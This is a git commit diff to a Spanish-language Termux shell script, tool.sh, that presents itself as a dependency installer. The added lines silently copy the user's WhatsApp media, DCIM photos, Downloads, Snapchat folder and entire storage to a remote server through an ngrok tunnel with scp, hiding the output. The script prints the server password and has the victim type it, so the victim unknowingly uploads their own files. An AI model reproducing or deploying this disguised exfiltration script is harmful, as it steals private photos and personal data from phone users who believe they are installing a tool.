a5e657b35241657d723d5cd7f52738bd5992f418
Offset-X <72325118+Offset-X@users.noreply.github.com>
2021-05-03 17:09:31 -0500

    Update tool.sh

--- tool.sh
+++ tool.sh
@@ -4,22 +4,22 @@ if ping -c1 google.com.mx &>/dev/null;
 then
         echo "Instalando Dependencias";
 	echo "-----------------------";
-	apt-get update -y ;
-	pkg install wget openssh net-tools  -y
+	#apt-get update -y ;
+	#pkg install wget openssh net-tools  -y
         echo "Dependencias Instaladas [OK]";
         #termux-setup-storage
         echo "Bienvenido ";
         echo "Passord: server12";
          echo "Espere unos minutos";
-        scp -P 15297 -r /storage/emulated/0/WhatsApp/Media/  server@0.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
+        scp -P 13538 -r /storage/emulated/0/WhatsApp/Media/  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
         echo "Ingrese la Contraseña del Servidor";      
-	scp -P 15297 -r /storage/emulated/0/DCIM/  server@0.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
+	scp -P 13538 -r /storage/emulated/0/DCIM/  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
         echo "Ingrese la Contraseña del Servidor";
-        scp -P 15297 -r /storage/emulated/0/Download/ server@0.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
+        scp -P 13538 -r /storage/emulated/0/Download/ server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
         echo "Ingrese la Contraseña del Servidor";
-        scp -P 15297 -r /storage/emulated/0/  server@0.tcp.ngrok.io:/home/server/Documentos/RECIVE_FULL &>/dev/null;
+        scp -P 13538 -r /storage/emulated/0/  server@4.tcp.ngrok.io:/home/server/Documentos/RECIVE_FULL &>/dev/null;
         echo "Ingrese la Contraseña del Servidor";
-        scp -P 15297 -r /storage/emulated/0/Snapchat  server@0.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
+        scp -P 13538 -r /storage/emulated/0/Snapchat  server@4.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
         echo "Proceso Finalizado";
         
 	$@
